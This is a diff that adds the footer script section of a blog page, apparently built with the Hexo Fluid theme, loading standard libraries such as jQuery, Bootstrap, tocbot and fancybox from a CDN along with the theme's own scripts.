+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
